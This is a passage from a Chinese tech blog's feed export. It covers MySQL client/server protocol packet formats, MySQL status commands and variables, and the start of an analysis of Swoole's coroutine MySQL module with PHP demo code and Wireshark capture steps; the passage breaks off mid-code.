消息报文</h4><p><strong>功能</strong>：设置语句选项，选项值为<code>/include/mysql_com.h</code>头文件中定义的<code>enum_mysql_set_option</code>枚举类型：</p><ul><li>MYSQL_OPTION_MULTI_STATEMENTS_ON</li><li>MYSQL_OPTION_MULTI_STATEMENTS_OFF</li></ul><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>选项值（小字节序）</td></tr></tbody></table><h4 id="4-2-24-COM-FETCH-STMT-消息报文"><a href="#4-2-24-COM-FETCH-STMT-消息报文" class="headerlink" title="4.2.24 COM_FETCH_STMT 消息报文"></a>4.2.24 COM_FETCH_STMT 消息报文</h4><p><strong>功能</strong>：获取预处理语句的执行结果（一次可以获取多行数据）。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>4</td><td>预处理语句的ID值（小字节序）</td></tr><tr><td>4</td><td>数据的行数（小字节序）</td></tr></tbody></table><h3 id="4-3-服务器响应报文（服务器-gt-客户端）"><a href="#4-3-服务器响应报文（服务器-gt-客户端）" class="headerlink" title="4.3 服务器响应报文（服务器 -&gt; 客户端）"></a>4.3 服务器响应报文（服务器 -&gt; 客户端）</h3><p>当客户端发起认证请求或命令请求后，服务器会返回相应的执行结果给客户端。客户端在收到响应报文后，需要首先检查第1个字节的值，来区分响应报文的类型。</p><table><thead><tr><th>响应报文类型</th><th>第1个字节取值范围</th></tr></thead><tbody><tr><td>OK 响应报文</td><td>0x00</td></tr><tr><td>Error 响应报文</td><td>0xFF</td></tr><tr><td>Result Set 报文</td><td>0x01 - 0xFA</td></tr><tr><td>Field 报文</td><td>0x01 - 0xFA</td></tr><tr><td>Row Data 报文</td><td>0x01 - 0xFA</td></tr><tr><td>EOF 报文</td><td>0xFE</td></tr></tbody></table><p>注：响应报文的第1个字节在不同类型中含义不同，比如在OK报文中，该字节并没有实际意义，值恒为0x00；而在Result Set报文中，该字节又是长度编码的二进制数据结构（Length Coded Binary）中的第1字节。</p><h4 id="4-3-1-OK-响应报文"><a href="#4-3-1-OK-响应报文" class="headerlink" title="4.3.1 OK 响应报文"></a>4.3.1 OK 响应报文</h4><p>客户端的命令执行正确时，服务器会返回OK响应报文。</p><p><strong>MySQL 4.0 及之前的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>OK报文，值恒为0x00</td></tr><tr><td>1-9</td><td>受影响行数（Length Coded Binary）</td></tr><tr><td>1-9</td><td>索引ID值（Length Coded Binary）</td></tr><tr><td>2</td><td>服务器状态</td></tr><tr><td>n</td><td>服务器消息（字符串到达消息尾部时结束，无结束符）</td></tr></tbody></table><p><strong>MySQL 4.1 及之后的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>OK报文，值恒为0x00</td></tr><tr><td>1-9</td><td>受影响行数（Length Coded Binary）</td></tr><tr><td>1-9</td><td>索引ID值（Length Coded Binary）</td></tr><tr><td>2</td><td>服务器状态</td></tr><tr><td>2</td><td>告警计数</td></tr><tr><td>n</td><td>服务器消息（字符串到达消息尾部时结束，无结束符，可选）</td></tr></tbody></table><p><strong>受影响行数</strong>：当执行<code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code>语句时所影响的数据行数。</p><p><strong>索引ID值</strong>：该值为<code>AUTO_INCREMENT</code>索引字段生成，如果没有索引字段，则为0x00。注意：当<code>INSERT</code>插入语句为多行数据时，该索引ID值为第一个插入的数据行索引值，而非最后一个。</p><p><strong>服务器状态</strong>：客户端可以通过该值检查命令是否在事务处理中。</p><p><strong>告警计数</strong>：告警发生的次数。</p><p><strong>服务器消息</strong>：服务器返回给客户端的消息，一般为简单的描述性字符串，可选字段。</p><h4 id="4-3-2-Error-响应报文"><a href="#4-3-2-Error-响应报文" class="headerlink" title="4.3.2 Error 响应报文"></a>4.3.2 Error 响应报文</h4><p><strong>MySQL 4.0 及之前的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>Error报文，值恒为0xFF</td></tr><tr><td>2</td><td>错误编号（小字节序）</td></tr><tr><td>n</td><td>服务器消息</td></tr></tbody></table><p><strong>MySQL 4.1 及之后的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>Error报文，值恒为0xFF</td></tr><tr><td>2</td><td>错误编号（小字节序）</td></tr><tr><td>1</td><td>服务器状态标志，恒为’#’字符</td></tr><tr><td>5</td><td>服务器状态（5个字符）</td></tr><tr><td>n</td><td>服务器消息</td></tr></tbody></table><p><strong>错误编号</strong>：错误编号值定义在源代码<code>/include/mysqld_error.h</code>头文件中。</p><p><strong>服务器状态</strong>：服务器将错误编号通过<code>mysql_errno_to_sqlstate</code>函数转换为状态值，状态值由5字节的ASCII字符组成，定义在源代码<code>/include/sql_state.h</code>头文件中。</p><p><strong>服务器消息</strong>：错误消息字符串到达消息尾时结束，长度可以由消息头中的长度值计算得出。消息长度为0-512字节。</p><h4 id="4-3-3-Result-Set-消息"><a href="#4-3-3-Result-Set-消息" class="headerlink" title="4.3.3 Result Set 消息"></a>4.3.3 Result Set 消息</h4><p>当客户端发送查询请求后，在没有错误的情况下，服务器会返回结果集（Result Set）给客户端。</p><p>Result Set 消息分为五部分，结构如下：</p><table><thead><tr><th>结构</th><th>说明</th></tr></thead><tbody><tr><td>[Result Set Header]</td><td>列数量</td></tr><tr><td>[Field]</td><td>列信息（多个）</td></tr><tr><td>[EOF]</td><td>列结束</td></tr><tr><td>[Row Data]</td><td>行数据（多个）</td></tr><tr><td>[EOF]</td><td>数据结束</td></tr></tbody></table><h4 id="4-3-4-Result-Set-Header-结构"><a href="#4-3-4-Result-Set-Header-结构" class="headerlink" title="4.3.4 Result Set Header 结构"></a>4.3.4 Result Set Header 结构</h4><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1-9</td><td>Field结构计数（Length Coded Binary）</td></tr><tr><td>1-9</td><td>额外信息（Length Coded Binary）</td></tr></tbody></table><p><strong>Field结构计数</strong>：用于标识Field结构的数量，取值范围0x00-0xFA。</p><p><strong>额外信息</strong>：可选字段，一般情况下不应该出现。只有像<code>SHOW COLUMNS</code>这种语句的执行结果才会用到额外信息（标识表格的列数量）。</p><h4 id="4-3-5-Field-结构"><a href="#4-3-5-Field-结构" class="headerlink" title="4.3.5 Field 结构"></a>4.3.5 Field 结构</h4><p>Field为数据表的列信息，在Result Set中，Field会连续出现多次，次数由Result Set Header结构中的IField结构计数值决定。</p><p><strong>MySQL 4.0 及之前的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>数据表名称（Length Coded String）</td></tr><tr><td>n</td><td>列（字段）名称（Length Coded String）</td></tr><tr><td>4</td><td>列（字段）长度（Length Coded String）</td></tr><tr><td>2</td><td>列（字段）类型（Length Coded String）</td></tr><tr><td>2</td><td>列（字段）标志（Length Coded String）</td></tr><tr><td>1</td><td>整型值精度</td></tr><tr><td>n</td><td>默认值（Length Coded String）</td></tr></tbody></table><p><strong>MySQL 4.1 及之后的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>目录名称（Length Coded String）</td></tr><tr><td>n</td><td>数据库名称（Length Coded String）</td></tr><tr><td>n</td><td>数据表名称（Length Coded String）</td></tr><tr><td>n</td><td>数据表原始名称（Length Coded String）</td></tr><tr><td>n</td><td>列（字段）名称（Length Coded String）</td></tr><tr><td>4</td><td>列（字段）原始名称（Length Coded String）</td></tr><tr><td>1</td><td>填充值</td></tr><tr><td>2</td><td>字符编码</td></tr><tr><td>4</td><td>列（字段）长度</td></tr><tr><td>1</td><td>列（字段）类型</td></tr><tr><td>2</td><td>列（字段）标志</td></tr><tr><td>1</td><td>整型值精度</td></tr><tr><td>2</td><td>填充值（0x00）</td></tr><tr><td>n</td><td>默认值（Length Coded String）</td></tr></tbody></table><p><strong>目录名称</strong>：在4.1及之后的版本中，该字段值为”def”。</p><p><strong>数据库名称</strong>：数据库名称标识。</p><p><strong>数据表名称</strong>：数据表的别名（<code>AS</code>之后的名称）。</p><p><strong>数据表原始名称</strong>：数据表的原始名称（<code>AS</code>之前的名称）。</p><p><strong>列（字段）名称</strong>：列（字段）的别名（<code>AS</code>之后的名称）。</p><p><strong>列（字段）原始名称</strong>：列（字段）的原始名称（<code>AS</code>之前的名称）。</p><p><strong>字符编码</strong>：列（字段）的字符编码值。</p><p><strong>列（字段）长度</strong>：列（字段）的长度值，真实长度可能小于该值，例如<code>VARCHAR(2)</code>类型的字段实际只能存储1个字符。</p><p><strong>列（字段）类型</strong>：列（字段）的类型值，取值范围如下（参考源代码<code>/include/mysql_com.h</code>头文件中的<code>enum_field_type</code>枚举类型定义）：</p><table><thead><tr><th>类型值</th><th>名称</th></tr></thead><tbody><tr><td>0x00</td><td>FIELD_TYPE_DECIMAL</td></tr><tr><td>0x01</td><td>FIELD_TYPE_TINY</td></tr><tr><td>0x02</td><td>FIELD_TYPE_SHORT</td></tr><tr><td>0x03</td><td>FIELD_TYPE_LONG</td></tr><tr><td>0x04</td><td>FIELD_TYPE_FLOAT</td></tr><tr><td>0x05</td><td>FIELD_TYPE_DOUBLE</td></tr><tr><td>0x06</td><td>FIELD_TYPE_NULL</td></tr><tr><td>0x07</td><td>FIELD_TYPE_TIMESTAMP</td></tr><tr><td>0x08</td><td>FIELD_TYPE_LONGLONG</td></tr><tr><td>0x09</td><td>FIELD_TYPE_INT24</td></tr><tr><td>0x0A</td><td>FIELD_TYPE_DATE</td></tr><tr><td>0x0B</td><td>FIELD_TYPE_TIME</td></tr><tr><td>0x0C</td><td>FIELD_TYPE_DATETIME</td></tr><tr><td>0x0D</td><td>FIELD_TYPE_YEAR</td></tr><tr><td>0x0E</td><td>FIELD_TYPE_NEWDATE</td></tr><tr><td>0x0F</td><td>FIELD_TYPE_VARCHAR (new in MySQL 5.0)</td></tr><tr><td>0x10</td><td>FIELD_TYPE_BIT (new in MySQL 5.0)</td></tr><tr><td>0xF6</td><td>FIELD_TYPE_NEWDECIMAL (new in MYSQL 5.0)</td></tr><tr><td>0xF7</td><td>FIELD_TYPE_ENUM</td></tr><tr><td>0xF8</td><td>FIELD_TYPE_SET</td></tr><tr><td>0xF9</td><td>FIELD_TYPE_TINY_BLOB</td></tr><tr><td>0xFA</td><td>FIELD_TYPE_MEDIUM_BLOB</td></tr><tr><td>0xFB</td><td>FIELD_TYPE_LONG_BLOB</td></tr><tr><td>0xFC</td><td>FIELD_TYPE_BLOB</td></tr><tr><td>0xFD</td><td>FIELD_TYPE_VAR_STRING</td></tr><tr><td>0xFE</td><td>FIELD_TYPE_STRING</td></tr><tr><td>0xFF</td><td>FIELD_TYPE_GEOMETRY</td></tr></tbody></table><p><strong>列（字段）标志</strong>：各标志位定义如下（参考源代码<code>/include/mysql_com.h</code>头文件中的宏定义）：</p><table><thead><tr><th>标志位</th><th>名称</th></tr></thead><tbody><tr><td>0x0001</td><td>NOT_NULL_FLAG</td></tr><tr><td>0x0002</td><td>PRI_KEY_FLAG</td></tr><tr><td>0x0004</td><td>UNIQUE_KEY_FLAG</td></tr><tr><td>0x0008</td><td>MULTIPLE_KEY_FLAG</td></tr><tr><td>0x0010</td><td>BLOB_FLAG</td></tr><tr><td>0x0020</td><td>UNSIGNED_FLAG</td></tr><tr><td>0x0040</td><td>ZEROFILL_FLAG</td></tr><tr><td>0x0080</td><td>BINARY_FLAG</td></tr><tr><td>0x0100</td><td>ENUM_FLAG</td></tr><tr><td>0x0200</td><td>AUTO_INCREMENT_FLAG</td></tr><tr><td>0x0400</td><td>TIMESTAMP_FLAG</td></tr><tr><td>0x0800</td><td>SET_FLAG</td></tr></tbody></table><p><strong>数值精度</strong>：该字段对<code>DECIMAL</code>和<code>NUMERIC</code>类型的数值字段有效，用于标识数值的精度（小数点位置）。</p><p><strong>默认值</strong>：该字段用在数据表定义中，普通的查询结果中不会出现。</p><p><strong>附</strong>：Field结构的相关处理函数：</p><ul><li>客户端：<code>/client/client.c</code>源文件中的<code>unpack_fields</code>函数</li><li>服务器：<code>/sql/sql_base.cc</code>源文件中的<code>send_fields</code>函数</li></ul><h4 id="4-3-6-EOF-结构"><a href="#4-3-6-EOF-结构" class="headerlink" title="4.3.6 EOF 结构"></a>4.3.6 EOF 结构</h4><p>EOF结构用于标识Field和Row Data的结束，在预处理语句中，EOF也被用来标识参数的结束。</p><p><strong>MySQL 4.0 及之前的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>EOF值（0xFE）</td></tr></tbody></table><p><strong>MySQL 4.1 及之后的版本</strong></p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>EOF值（0xFE）</td></tr><tr><td>2</td><td>告警计数</td></tr><tr><td>2</td><td>状态标志位</td></tr></tbody></table><p><strong>告警计数</strong>：服务器告警数量，在所有数据都发送给客户端后该值才有效。</p><p><strong>状态标志位</strong>：包含类似<code>SERVER_MORE_RESULTS_EXISTS</code>这样的标志位。</p><p><strong>注</strong>：由于EOF值与其它Result Set结构共用1字节，所以在收到报文后需要对EOF包的真实性进行校验，校验条件为：</p><ul><li>第1字节值为0xFE</li><li>包长度小于9字节</li></ul><p><strong>附</strong>：EOF结构的相关处理函数：</p><ul><li>服务器：<code>protocol.cc</code>源文件中的<code>send_eof</code>函数</li></ul><h4 id="4-3-7-Row-Data-结构"><a href="#4-3-7-Row-Data-结构" class="headerlink" title="4.3.7 Row Data 结构"></a>4.3.7 Row Data 结构</h4><p>在Result Set消息中，会包含多个Row Data结构，每个Row Data结构又包含多个字段值，这些字段值组成一行数据。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>n</td><td>字段值（Length Coded String）</td></tr><tr><td>…</td><td>（一行数据中包含多个字段值）</td></tr></tbody></table><p><strong>字段值</strong>：行数据中的字段值，字符串形式。</p><p><strong>附</strong>：Row Data结构的相关处理函数：</p><ul><li>客户端：<code>/client/client.c</code>源文件中的<code>read_rows</code>函数</li></ul><h4 id="4-3-8-Row-Data-结构（二进制数据）"><a href="#4-3-8-Row-Data-结构（二进制数据）" class="headerlink" title="4.3.8 Row Data 结构（二进制数据）"></a>4.3.8 Row Data 结构（二进制数据）</h4><p>该结构用于传输二进制的字段值，既可以是服务器返回的结果，也可以是由客户端发送的（当执行预处理语句时，客户端使用Result Set消息来发送参数及数据）。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>结构头（0x00）</td></tr><tr><td>(列数量 + 7 + 2) / 8</td><td>空位图</td></tr><tr><td>n</td><td>字段值</td></tr><tr><td>…</td><td>（一行数据中包含多个字段值）</td></tr></tbody></table><p><strong>空位图</strong>：前2个比特位被保留，值分别为0和1，以保证不会和OK、Error包的首字节冲突。在MySQL 5.0及之后的版本中，这2个比特位的值都为0。</p><p><strong>字段值</strong>：行数据中的字段值，二进制形式。</p><h4 id="4-3-9-PREPARE-OK-响应报文（Prepared-Statement）"><a href="#4-3-9-PREPARE-OK-响应报文（Prepared-Statement）" class="headerlink" title="4.3.9 PREPARE_OK 响应报文（Prepared Statement）"></a>4.3.9 PREPARE_OK 响应报文（Prepared Statement）</h4><p>用于响应客户端发起的预处理语句报文，组成结构如下：</p><table><thead><tr><th>结构</th><th>说明</th></tr></thead><tbody><tr><td>[PREPARE_OK]</td><td>PREPARE_OK结构</td></tr><tr><td>如果参数数量大于0</td><td></td></tr><tr><td>[Field]</td><td>与Result Set消息结构相同</td></tr><tr><td>[EOF]</td><td></td></tr><tr><td>如果列数大于0</td><td></td></tr><tr><td>[Field]</td><td>与Result Set消息结构相同</td></tr><tr><td>[EOF]</td></tr></tbody></table><p>其中 PREPARD_OK 的结构如下：</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td>OK报文，值为0x00</td></tr><tr><td>4</td><td>预处理语句ID值</td></tr><tr><td>2</td><td>列数量</td></tr><tr><td>2</td><td>参数数量</td></tr><tr><td>1</td><td>填充值（0x00）</td></tr><tr><td>2</td><td>告警计数</td></tr></tbody></table><h4 id="4-3-10-Parameter-响应报文（Prepared-Statement）"><a href="#4-3-10-Parameter-响应报文（Prepared-Statement）" class="headerlink" title="4.3.10 Parameter 响应报文（Prepared Statement）"></a>4.3.10 Parameter 响应报文（Prepared Statement）</h4><p>预处理语句的值与参数正确对应后，服务器会返回 Parameter 报文。</p><table><thead><tr><th>字节</th><th>说明</th></tr></thead><tbody><tr><td>2</td><td>类型</td></tr><tr><td>2</td><td>标志</td></tr><tr><td>1</td><td>数值精度</td></tr><tr><td>4</td><td>字段长度</td></tr></tbody></table><p><strong>类型</strong>：与 Field 结构中的字段类型相同。</p><p><strong>标志</strong>：与 Field 结构中的字段标志相同。</p><p><strong>数值精度</strong>：与 Field 结构中的数值精度相同。</p><p><strong>字段长度</strong>：与 Field 结构中的字段长度相同。</p><h2 id="5-参考资料"><a href="#5-参考资料" class="headerlink" title="5 参考资料"></a>5 参考资料</h2><p>《<a href="http://dev.mysql.com/doc/internals/en/index.html" target="_blank" rel="noopener">MySQL Internals Manual</a>: <a href="http://dev.mysql.com/doc/internals/en/client-server-protocol.html" target="_blank" rel="noopener">MySQL Client/Server Protocol</a>》</p><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p><a href="http://hutaow.com/blog/2013/11/06/mysql-protocol-analysis/" target="_blank" rel="noopener">http://hutaow.com/blog/2013/11/06/mysql-protocol-analysis/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-交互过程&quot;&gt;&lt;a href=&quot;#1-交互过程&quot; class=&quot;headerlink&quot; title=&quot;1 交互过程&quot;&gt;&lt;/a&gt;1 交互过程&lt;/h2&gt;&lt;p&gt;MySQL客户端与服务器的交互主要分为两个阶段：握手认证阶段和命令执行阶段。&lt;/p&gt;
&lt;h3 id=&quot;1-1-握手认证阶段&quot;&gt;&lt;a href=&quot;#1-1-握手认证阶段&quot; class=&quot;headerlink&quot; title=&quot;1.1 握手认证阶段&quot;&gt;&lt;/a&gt;1.1 握手认证阶段&lt;/h3&gt;&lt;p&gt;握手认证阶段为客户端与服务器建立连接后进行，交互过程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器 -&amp;gt; 客户端：握手初始化消息&lt;/li&gt;
&lt;li&gt;客户端 -&amp;gt; 服务器：登陆认证消息&lt;/li&gt;
&lt;li&gt;服务器 -&amp;gt; 客户端：认证结果消息&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;1-2-命令执行阶段&quot;&gt;&lt;a href=&quot;#1-2-命令执行阶段&quot; class=&quot;headerlink&quot; title=&quot;1.2 命令执行阶段&quot;&gt;&lt;/a&gt;1.2 命令执行阶段&lt;/h3&gt;&lt;p&gt;客户端认证成功后，会进入命令执行阶段，交互过程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端 -&amp;gt; 服务器：执行命令消息&lt;/li&gt;
&lt;li&gt;服务器 -&amp;gt; 客户端：命令执行结果&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>[整理]MySQL查看连接数以及状态</title>
    <link href="http://www.twosee.cn/2018/05/12/mysql-status-check/"/>
    <id>http://www.twosee.cn/2018/05/12/mysql-status-check/</id>
    <published>2018-05-12T03:05:53.000Z</published>
    <updated>2018-05-12T03:22:18.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Connections"><a href="#Connections" class="headerlink" title="Connections"></a>Connections</h2><p><strong>命令：<code>show processlist;</code></strong><br><strong>如果是root帐号，你能看到所有用户的当前连接。如果是其它普通帐号，只能看到自己占用的连接。</strong><br><code>show processlist</code>只列出前100条</p><p>如果想全列出请使用<strong><code>show full processlist;</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show processlist;</span><br></pre></td></tr></table></figure><h2 id="Status"><a href="#Status" class="headerlink" title="Status"></a>Status</h2><p><strong>命令： <code>show status;</code></strong></p><p><strong>命令：<code>show status like &#39;%下面变量%&#39;;</code></strong></p><a id="more"></a><table><thead><tr><th>关键字</th><th>说明</th></tr></thead><tbody><tr><td>Aborted_clients</td><td>由于客户没有正确关闭连接已经死掉，已经放弃的连接数量。</td></tr><tr><td>Aborted_connects</td><td>尝试已经失败的MySQL服务器的连接的次数。</td></tr><tr><td>Connections</td><td>试图连接MySQL服务器的次数。</td></tr><tr><td>Created_tmp_tables</td><td>当执行语句时，已经被创造了的隐含临时表的数量。</td></tr><tr><td>Delayed_insert_threads</td><td>正在使用的延迟插入处理器线程的数量。</td></tr><tr><td>Delayed_writes</td><td>用INSERT/DELAYED写入的行数。</td></tr><tr><td>Delayed_errors</td><td>用INSERT/DELAYED写入的发生某些错误(可能重复键值)的行数。</td></tr><tr><td>Flush_commands</td><td>执行FLUSH命令的次数。</td></tr><tr><td>Handler_delete</td><td>请求从一张表中删除行的次数。</td></tr><tr><td>Handler_read_first</td><td>请求读入表中第一行的次数。</td></tr><tr><td>Handler_read_key</td><td>请求数字基于键读行。</td></tr><tr><td>Handler_read_next</td><td>请求读入基于一个键的一行的次数。</td></tr><tr><td>Handler_read_rnd</td><td>请求读入基于一个固定位置的一行的次数。</td></tr><tr><td>Handler_update</td><td>请求更新表中一行的次数。</td></tr><tr><td>Handler_write</td><td>请求向表中插入一行的次数。</td></tr><tr><td>Key_blocks_used</td><td>用于关键字缓存的块的数量。</td></tr><tr><td>Key_read_requests</td><td>请求从缓存读入一个键值的次数。</td></tr><tr><td>Key_reads</td><td>从磁盘物理读入一个键值的次数。</td></tr><tr><td>Key_write_requests</td><td>请求将一个关键字块写入缓存次数。</td></tr><tr><td>Key_writes</td><td>将一个键值块物理写入磁盘的次数。</td></tr><tr><td>Max_used_connections</td><td>同时使用的连接的最大数目。</td></tr><tr><td>Not_flushed_key_blocks</td><td>在键缓存中已经改变但是还没被清空到磁盘上的键块。</td></tr><tr><td>Not_flushed_delayed_rows</td><td>在INSERT/DELAY队列中等待写入的行的数量。</td></tr><tr><td>Open_tables</td><td>打开表的数量。</td></tr><tr><td>Open_files</td><td>打开文件的数量。</td></tr><tr><td>Open_streams</td><td>打开流的数量(主要用于日志记载）</td></tr><tr><td>Opened_tables</td><td>已经打开的表的数量。</td></tr><tr><td>Questions</td><td>发往服务器的查询的数量。</td></tr><tr><td>Slow_queries</td><td>要花超过long_query_time时间的查询数量。</td></tr><tr><td>Threads_connected</td><td>当前打开的连接的数量。</td></tr><tr><td>Threads_running</td><td>不在睡眠的线程数量。</td></tr><tr><td>Uptime</td><td>服务器工作了多少秒。</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Connections&quot;&gt;&lt;a href=&quot;#Connections&quot; class=&quot;headerlink&quot; title=&quot;Connections&quot;&gt;&lt;/a&gt;Connections&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;命令：&lt;code&gt;show processlist;&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;如果是root帐号，你能看到所有用户的当前连接。如果是其它普通帐号，只能看到自己占用的连接。&lt;/strong&gt;&lt;br&gt;&lt;code&gt;show processlist&lt;/code&gt;只列出前100条&lt;/p&gt;
&lt;p&gt;如果想全列出请使用&lt;strong&gt;&lt;code&gt;show full processlist;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; show processlist;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Status&quot;&gt;&lt;a href=&quot;#Status&quot; class=&quot;headerlink&quot; title=&quot;Status&quot;&gt;&lt;/a&gt;Status&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;命令： &lt;code&gt;show status;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;命令：&lt;code&gt;show status like &amp;#39;%下面变量%&amp;#39;;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Swoole的Mysql模块浅析-1</title>
    <link href="http://www.twosee.cn/2018/05/11/swoole-mysql-analyzation-1/"/>
    <id>http://www.twosee.cn/2018/05/11/swoole-mysql-analyzation-1/</id>
    <published>2018-05-11T12:48:00.000Z</published>
    <updated>2018-05-12T03:20:26.323Z</updated>
    
    <content type="html"><![CDATA[<p>众所周知, PHP是由C语言编写的, 扩展也不例外, Swoole又是PHP扩展中发展的比较快且很权威的一个扩展, 对于MySQL这部分模块的浅析, 暂可不必了解Swoole底层的实现, 而先关注应用层面的实现.</p><h2 id="基础要求"><a href="#基础要求" class="headerlink" title="基础要求"></a>基础要求</h2><p>所以除了PHP我们仅需了解以下几个方面的知识:</p><ol><li>MySQL基础</li><li>TCP网络协议基础(MySQL协议)</li><li>C语言基础及其简单调试</li></ol><p>而使用过Swoole的同学一定对以下工具不陌生:</p><ol><li><code>GDB</code>(Mac下用<code>LLDB</code>)和<code>Valgrind</code>作为源码/内存分析</li><li><code>Wireshark</code>或<code>TcpDump</code>作为网络分析</li></ol><a id="more"></a><h2 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h2><p>首先我们写一个简单的协程Mysql查询Demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">go(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    $db = <span class="keyword">new</span> Swoole\Coroutine\Mysql;</span><br><span class="line">    $server = [</span><br><span class="line">        <span class="string">'host'</span>     =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'user'</span>     =&gt; <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'password'</span> =&gt; <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'database'</span> =&gt; <span class="string">'test'</span></span><br><span class="line">    ];</span><br><span class="line">    $db-&gt;connect($server);</span><br><span class="line">    $stmt = $db-&gt;prepare(<span class="string">'SELECT * FROM `userinfo`'</span>);</span><br><span class="line">    $ret = $stmt-&gt;execute([]);</span><br><span class="line">    var_dump($ret);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后我们可以使用Wireshark对本地网络进行捕获<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWgy1fr7pj4z2djj30rs0m8jtr.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure></p><p>依托于功能强大的wireshark, 我们只需过滤器里输入<code>mysql</code>即可从繁忙的本地网络中筛选出mysql通信的数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWgy1fr7ptebaaej30rk06x409.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以看到MySQL通信<strong>建立后</strong>的部分(不包括前面TCP握手等部分)</p><ol><li>Mysql服务器向客户端打招呼, 并携带了自身版本信息</li><li>客户端收到后, 发起登录请求, 并携带了配置参数(用户名/密码/使用编码/选择进入的数据库等)</li><li>Mysql响应登录成功</li><li>发出一个携带SQL语句的PREPARE请求来编译模板语句 [COM_STMT_PREPARE]</li><li>Mysql响应PREPARE_OK响应报文 (这里的返回报文比较复杂,在下一篇细讲)</li><li>发出执行指定ID模板语句的请求, 并携带了参数数据  [COM_STMT_EXECUTE]</li><li>Mysql响应结果集(此处也很复杂)</li></ol><h2 id="问题发现-swoole的疏漏"><a href="#问题发现-swoole的疏漏" class="headerlink" title="问题发现: swoole的疏漏?"></a>问题发现: swoole的疏漏?</h2><p>乍看之下这一套流程并没有什么问题, 但由于在此之前我是PDO的忠实粉丝(Swoole的Statement功能也是当初机缘巧合我建议Rango大佬考虑加入的), 所以我在阅读Swoole源码的同时也阅读了PDO源码并编写demo互作比对, 然后很快就发现了问题.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=127.0.0.1;dbname=test;charset=utf8"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="keyword">false</span>);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM  userinfo WHERE `id`=:id"</span>;</span><br><span 